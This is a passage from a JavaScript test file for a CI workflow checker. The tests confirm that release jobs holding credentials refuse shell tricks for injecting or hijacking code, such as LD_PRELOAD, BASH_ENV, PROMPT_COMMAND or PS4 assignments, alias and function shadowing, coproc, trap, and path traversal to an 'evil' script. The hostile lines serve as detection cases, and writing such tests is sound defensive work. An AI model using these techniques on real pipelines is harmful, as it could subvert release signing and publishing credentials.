		["node scripts/../evil/x.mjs", /node runs a script through a \. or \.\. segment/],
	]) {
		const reasons = [...shellCommands(script)].flatMap((command) => buildStepReasons(command, build));
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${script}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	for (const fine of [
		"node scripts/resolve-release-context.mjs",
		'node scripts/validate-macos-release.mjs "$artifacts" "$TARGET_PLATFORM" "$RUNNER_TEMP/x"',
		"node -p \"require('./package.json').version\"",
		'python3 -m http.server 18188 --bind 127.0.0.1 --directory "$SMOKE_ROOT"',
		'sh /tmp/prime-agent-npm12-install.sh "$SMOKE_VERSION"',
		"node --version",
		"npm run build",
		'echo "node $x"',
	]) {
		assert.deepEqual([...shellCommands(fine)].flatMap((command) => buildStepReasons(command, build)), [], fine);
	}
	// ...and the workflow-level check reaches the build jobs of both workflows.
	for (const [path, jobId] of [[RELEASE, "build"], [RELEASE, "assemble"], [RELEASE, "pack-npm"], [STANDALONE, "build"]]) {
		const broken = mutate(path, (text) => appendStep(text, jobId, runStep("Sneak in a script", 'dir=scripts; /usr/bin/node "$dir"/publish.mjs')));
		const problems = checkWorkflows(reader({ [path]: broken }));
		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && /runs node through a path/.test(problem)), `${path} ${jobId}:\n${problems.join("\n")}`);
		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && /node runs a script named by an expansion/.test(problem)), `${path} ${jobId}:\n${problems.join("\n")}`);
	}
	assert.deepEqual(checkWorkflows(), []);
});

test("every way to run or prepare code around a command is refused in a credential-bearing job (round 6, finding 7)", () => {
	const options = { artifactDirectories: ["artifacts"], jobId: "publish-r2" };
	const cases = [
		["coproc, simple form", "coproc node scripts/x.mjs", /runs coproc, a wrapper|runs node, which is not on the command allowlist/],
		["coproc, named form", "coproc worker { node scripts/x.mjs; }", /runs coproc, a wrapper/],
		["coproc, named form, inner command is still resolved", "coproc worker { python3 -c 1; }", /runs python3, which is not on the command allowlist/],
		["coproc of an allowlisted command", 'coproc aws s3 ls --endpoint-url "$R2_ENDPOINT_URL" "s3://${R2_BUCKET}/"', /runs coproc, a wrapper/],
		["builtin", 'builtin eval "node scripts/x.mjs"', /runs builtin, a wrapper|eval runs a command the checker cannot see/],
		["command -p", "command -p node scripts/x.mjs", /runs command, a wrapper|runs node, which is not on the command allowlist/],
		["exec -a NAME resolves the real command", "exec -a aws node scripts/x.mjs", /runs node, which is not on the command allowlist/],
		["exec -a NAME with a path", "exec -a aws /usr/bin/python3 -c 1", /runs \/usr\/bin\/python3 through a path/],
		["{ ...; } &", "{ node scripts/x.mjs; } &", /runs node, which is not on the command allowlist/],
		["{ ...; } & is backgrounded", "{ node scripts/x.mjs; } &", /runs a command in the background/],
		["( ... ) &", "( node scripts/x.mjs ) &", /runs node, which is not on the command allowlist/],
		["( ... ) & is backgrounded", "( node scripts/x.mjs ) &", /runs a command in the background/],
		["& backgrounding", "python3 -c 1 &\nwait", /runs python3, which is not on the command allowlist/],
		["& backgrounding of an allowlisted command", 'aws s3 ls --endpoint-url "$R2_ENDPOINT_URL" "s3://${R2_BUCKET}/" &\nwait', /runs a command in the background, so its failure would go unnoticed/],
		["wait after a background job", "sleep 1 &\nwait", /runs a command in the background/],
		["trap body", "trap 'node scripts/x.mjs' EXIT", /trap changes how commands resolve or run/],
		["trap body, inline code", "trap 'python3 -c 1' EXIT", /trap changes how commands resolve or run/],
		["alias", "alias aws='node scripts/x.mjs'", /alias changes how commands resolve or run/],
		["function shadowing an allowlisted name", "function aws { node scripts/x.mjs; }", /defines a shell function named aws/],
		["function body is parsed", "function helper { python3 -c 1; }", /runs python3, which is not on the command allowlist/],
		["name() body is parsed", "helper() { python3 -c 1; }\nhelper", /runs python3, which is not on the command allowlist/],
		[". file", ". scripts/x.sh", /sources a file/],
		["source file", "source /tmp/x.sh", /sources a file/],
		["PROMPT_COMMAND", "PROMPT_COMMAND='node scripts/x.mjs'", /sets PROMPT_COMMAND, which loads code/],
		["export PROMPT_COMMAND", "export PROMPT_COMMAND='python3 -c 1'", /sets PROMPT_COMMAND, which loads code/],
		["PS4 with set -x", "PS4='$(python3 -c 1)'\nset -x", /sets PS4, which loads code/],
		["readonly PS4", "readonly PS4='$(python3 -c 1)'", /sets PS4, which loads code/],
		["PS0", "PS0='$(python3 -c 1)'", /sets PS0, which loads code/],
		["BASH_ENV, plain assignment", "BASH_ENV=/tmp/x.sh", /sets BASH_ENV, which loads code/],
		["BASH_ENV, prefix", "BASH_ENV=/tmp/x.sh bash -c 1", /sets BASH_ENV, which loads code/],
		["BASH_ENV, typeset", "typeset BASH_ENV=/tmp/x", /sets BASH_ENV, which loads code/],
		["ENV", "ENV=/tmp/x.sh", /sets ENV, which loads code/],
		["CDPATH", "CDPATH=/tmp", /sets CDPATH, which loads code/],
		["export CDPATH", "export CDPATH=/tmp", /sets CDPATH, which loads code/],
		["local -x CDPATH", "local -x CDPATH=/tmp", /sets CDPATH, which loads code/],
		["PATH", "PATH=/tmp:$PATH", /modifies PATH/],
		["export PATH", "export PATH=/tmp:$PATH", /modifies PATH/],
		["declare PATH", "declare -x PATH=/tmp:$PATH", /modifies PATH/],
		["LD_PRELOAD, plain assignment", "LD_PRELOAD=/tmp/x.so", /sets LD_PRELOAD, which loads code/],
		["LD_PRELOAD, declare -x", "declare -x LD_PRELOAD=/tmp/x.so", /sets LD_PRELOAD, which loads code/],
		["LD_PRELOAD, prefix", "LD_PRELOAD=/tmp/x.so aws s3 ls", /sets LD_PRELOAD, which loads code/],
		["read into PROMPT_COMMAND", "read -r PROMPT_COMMAND </tmp/x", /sets PROMPT_COMMAND, which loads code/],
		["printf -v PROMPT_COMMAND", "printf -v PROMPT_COMMAND 'python3 -c 1'", /sets PROMPT_COMMAND, which loads code/],
		["nameref onto PATH", "declare -n ref=PATH; ref=/tmp", /declare -n creates a name reference/],
		["local nameref", "local -n ref=BASH_ENV", /local -n creates a name reference/],
		["GLOBIGNORE", "GLOBIGNORE='*.sigstore.json'", /sets GLOBIGNORE, which loads code/],
		["EXECIGNORE", "EXECIGNORE=/usr/bin/aws", /sets EXECIGNORE, which loads code/],
		["BASH_LOADABLES_PATH", "BASH_LOADABLES_PATH=/tmp", /sets BASH_LOADABLES_PATH, which loads code/],
		["BASH_XTRACEFD", "BASH_XTRACEFD=3", /sets BASH_XTRACEFD, which loads code/],
		["SHELL", "SHELL=/tmp/x", /sets SHELL, which loads code/],
		["enable -f", "enable -f /tmp/x.so aws", /enable changes how commands resolve or run/],
		["BASH_FUNC export trick", "BASH_FUNC_aws%%='() { node scripts/x.mjs; }'", /through a path|executes a relative path/],
		["env prefix", "env PATH=/tmp aws s3 ls", /modifies PATH|runs env, a wrapper/],
	];
	for (const [label, script, pattern] of cases) {
		const reasons = credentialStepReasons(script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The workflow-level check reaches every credential-bearing job, using the plain-assignment
	// forms that round 5 let through.
	for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "github-release", "github-release-beta", "publish-npm", "tap-bump", "sign"]) {
		for (const [script, pattern] of [["LD_PRELOAD=/tmp/x.so", /sets LD_PRELOAD/], ["BASH_ENV=/tmp/x.sh", /sets BASH_ENV/], ["CDPATH=/tmp", /sets CDPATH/], ["PS4='$(python3 -c 1)'\nset -x", /sets PS4/], ["coproc worker { python3 -c 1; }", /runs coproc, a wrapper/], ["sleep 1 &\nwait", /runs a command in the background/]]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a setup", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${script} in ${jobId}:\n${problems.join("\n")}`);
		}
	}
	// What the checked-in jobs do stays accepted: IFS on a read, a function with a private name, `wait` on nothing.
	for (const fine of ["while IFS=$'\\t' read -r name digest; do echo \"$name\"; done < artifacts/SHA256SUMS", "helper() { echo x; }\nhelper", "command -v aws", "wait"]) {
		assert.deepEqual(credentialStepReasons(fine, options), [], fine);
	}
	// The parser marks exactly the backgrounded command.
	const parsed = [...shellCommands("aws s3 ls &\nwait\necho a && echo b\ntrue | false")];
	assert.deepEqual(parsed.map((command) => command.background), [true, false, false, false, false, false]);
	assert.deepEqual(checkWorkflows(), []);
});
